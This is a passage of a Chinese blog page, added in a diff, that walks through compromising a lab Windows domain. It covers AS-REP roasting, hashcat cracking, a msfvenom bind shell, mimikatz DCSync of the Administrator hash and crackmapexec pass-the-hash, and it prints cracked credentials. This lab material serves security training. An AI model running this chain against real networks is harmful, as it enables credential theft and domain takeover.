+| 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         |
+| 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     |
+| 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        |
+| 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        |
+| 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         |
+| 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       |
+| 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        |
+| 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   |
+| 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    |
+| 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       |
+| 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        |
+| 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     |
+| 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     |
+| 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           |
+| 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          |
+| 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         |
+| 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          |
+| 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          |
+| 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        |
+| 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  |
+| 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     |
+| 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          |
+| 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      |
+| 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        |
+| 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    |
+| 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       |
+| 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         |
+| 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          |
+| 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        |
+| 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          |
+| 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         |
+| 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        |
+| 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       |
+| 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         |
+| 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         |
+| 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      |
+| 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         |
+| 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       |
+| 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        |
+| 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        |
+| 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          |
+| 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       |
+| 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           |
+| 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       |
+| 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        |
+| 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         |
+| 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         |
+| 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       |
+| 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       |
+| 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           |
+| 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        |
+| 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         |
+| 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         |
+| 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       |
+| 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         |
+| 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         |
+| 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   |
+| 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        |
+| 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       |
+| 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          |
+| 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        |
+| 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          |
+| 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    |
+| 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           |
+| 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          |
+| 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         |
+| 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         |
+| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |
+| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |
+| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |
+| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |
++-----+----------------------------+-------------+-----------------+
+</code></pre>
+<p>正则处理一下数据<code>cat userinfo | grep -Po &#39;[a-z]+@xiaorang.lab&#39; &gt; user.txt</code></p>
+<p>然后尝试<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45954730/article/details/140647751">AS-REP Rroasting</a>攻击</p>
+<p><code>proxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Time/10.png" alt="img"></p>
+<pre><code class="Plain">$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:475cb769d24358fbf9b51e24025e08b9$65e4ab39a945ac4be228557a76ff29407330420356e363400223d60ccb98a76ee2f924b596cbc79d33fc1c9fd78636264b964e79c6652231fdbeaaee17ce9e862b2f70dc4fc961514fe65a11394e33f5824c6913f40c5f86b75ee19adcf0937e032c2d51f9d60847af2e96b1c24b9df3c8b1444f89ac026edac6cfa3f017aab52db2fa331eac31cb23351e1aa85a649c0982c70a732934c7eada0b97fb92e9e359b91cbfd181ffb76c597b6c42fa9af0991abce1c8af543a6a2af8b8abcb129d62b3e699dcb8e52f9d14677e7c6d10e985eae97d0ce15a856a3ccc1590e4b4123ada9e1adcc5298eb2726ea9
+</code></pre>
+<p><code>hashcat</code>解一下密码<code>hashcat -a 0 -m 18200 --force hash.txt rockyou.txt</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Time/11.png" alt="img"></p>
+<p>得到账号密码<code>zhangxin@xiaorang.lab:strawberry</code></p>
+<p><code>rdp</code>上线</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Time/12.png" alt="img"></p>
+<p>传一个SharpHound上去<code>SharpHound.exe -c all</code></p>
+<p>得到的域内关系利用<code>BloodHound</code><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43571641/article/details/124158754?utm_source=miniapp_weixin">分析</a></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Time/13.png" alt="img"></p>
+<p>“Find Shortest Paths to Domain Admins”查找最短路</p>
+<p><code>yuxuan</code>在这里是自动登录用户，直接查登录密码</p>
+<p><code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></p>
+<p>也可以生成一个正向<code>shell</code>抓自动登录密码</p>
+<pre><code class="Plain">msfvenom -p windows/meterpreter/bind_tcp -f exe -o shy.exe
+
+use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp
+set rhost 172.22.6.25
+run
+
+meterpreter &gt; run windows/gather/credentials/windows_autologin
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Time/14.png" alt="img"></p>
+<p><code>yuxuan:Yuxuan7QbrgZ3L</code></p>
+<p>重新<code>rdp</code>登录<code>yuxuan</code>的账号</p>
+<p>传<code>mimikatz.exe</code>抓Administrator的hash</p>
+<p><code>mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Time/15.png" alt="img"></p>
+<pre><code class="Plain">C:\Users\yuxuan\Desktop&gt;mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /user:Administrator
+[DC] &#39;xiaorang.lab&#39; will be the domain
+[DC] &#39;DC-PROGAME.xiaorang.lab&#39; will be the DC server
+[DC] &#39;Administrator&#39; will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   : 1601/1/1 8:00:00
+Password last change : 2025/4/19 22:36:00
+Object Security ID   : S-1-5-21-3623938633-4064111800-2925858365-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 04d93ffd6f5f6e4490e0de23f240a5e9
+</code></pre>
+<p>可以拿到域控的<code>system</code>权限，打<code>pth</code>收下剩下两个flag</p>
+<p><code>proxychains4 crackmapexec smb 172.22.6.25 -u administrator -H04d93ffd6f5f6e4490e0de23f240a5e9 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Time/16.png" alt="img"></p>
+<p><code>proxychains4 crackmapexec smb 172.22.6.12 -u administrator -H04d93ffd6f5f6e4490e0de23f240a5e9 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag04.txt&quot;</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Time/17.png" alt="img"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2025 『1nv_qaq&#39;s Blog』
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;1nv-qaq
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script src="/js/<fireworks.min.js>"></script>
+
+
+    <canvas
+    id="fireworks"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
+></canvas>
+<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<script src="/js/fireworks.min.js"></script>
+
+
+
+
+    
+    
+
+
+
+
+    
+</body>
+</html>
